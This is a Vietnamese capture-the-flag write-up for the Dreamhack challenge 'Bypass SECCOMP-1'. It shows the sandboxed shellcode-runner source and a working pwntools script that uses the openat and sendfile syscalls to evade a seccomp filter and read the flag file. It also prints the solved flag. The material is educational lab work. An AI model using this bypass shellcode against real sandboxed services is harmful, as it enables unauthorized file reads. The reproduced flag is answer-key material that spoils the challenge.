# Bypass SECCOMP-1

**source C:**

```c 
// Name: bypass_seccomp.c
// Compile: gcc -o bypass_seccomp bypass_seccomp.c -lseccomp

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void sandbox() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 0);

  seccomp_load(ctx);
}

int main(int argc, char *argv[]) {
  void *shellcode = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  void (*sc)();

  init();

  memset(shellcode, 0, 0x1000);

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sandbox();

  sc = (void *)shellcode;
  sc();
}

```

hàm **sandbox()** này tương đương 1 lớp bảo vệ **seccomp** vậy, kiểm tra xem sao:


![image](https://github.com/gookoosss/CTF/assets/128712571/5b6addb4-eb1f-47e4-ab2b-eabbc7d8fe1c)


ở đây **ta ko dùng được các syscall write, open, execve, execveat, và các syscall khác nằm ngoài ARCH_X86_64**

bây giờ ta đoán được đường dẫn đến flag đa số là **/home/<name>chall/flag**, nên ta đoán đường dẫn cho chall này là **'/home/bypass_seccomp/flag'**
    
ta cần tìm các **syscall khác mà có chức năng tương tự như open, write, read để in flag**
    
theo như mình tham khảo từ nhiều nguồn thì mình tìm được 2 syscall hợp lý cho bài này** openat và sendfile**
    
## opennat 
    
![image](https://github.com/gookoosss/CTF/assets/128712571/9a051b5a-bf07-4466-b508-f160892faaf0)



Tóm lại, openat là một phiên bản mở rộng của open, cho phép mở tập tin dựa trên một file descriptor thư mục và đường dẫn tương đối. Điều này mang lại tính linh hoạt và quyền kiểm soát cao hơn cho việc quản lý tập tin trong ứng dụng.

## sendfile

    
![image](https://github.com/gookoosss/CTF/assets/128712571/21b3de51-5f6a-456b-bb00-98e24126bb34)


Tóm lại, syscall sendfile như là 1 phiên bản kết hợp tối ưu giữa sự kết hợp 2 syscall write và read
    

**(giải thích chi tiết hơn mình đã có note lại trong script nha)**

## script:

```python 
from pwn import *

p = remote('host3.dreamhack.games', 9591)
# p = process('./bypass_seccomp')
context.arch = 'x86_64'

# gdb.attach(p, gdbscript = '''
# b*main+139
# c        
# ''')

# input()

link = '/home/bypass_seccomp/flag'

payload = shellcraft.openat(0, link , 0) # thiết lập rsi(arg1) thành đường dẫn 
payload += shellcraft.sendfile(1, 'rax', 0 , 100)
# arg2(rdx)  và arg3(r10) coi như là offset vậy nên ta cho đọc từ 0 đến 0x100
# rdi ta cho 1
# rsi thì cho giá trị trả về của openat là rax

p.sendafter('shellcode: ', asm(payload))


p.interactive()

#DH{fdac9699a765693377fe6595a82744934ed91185f0300447c45f143a0c08c8c1}
```

## Flag:

DH{fdac9699a765693377fe6595a82744934ed91185f0300447c45f143a0c08c8c1}

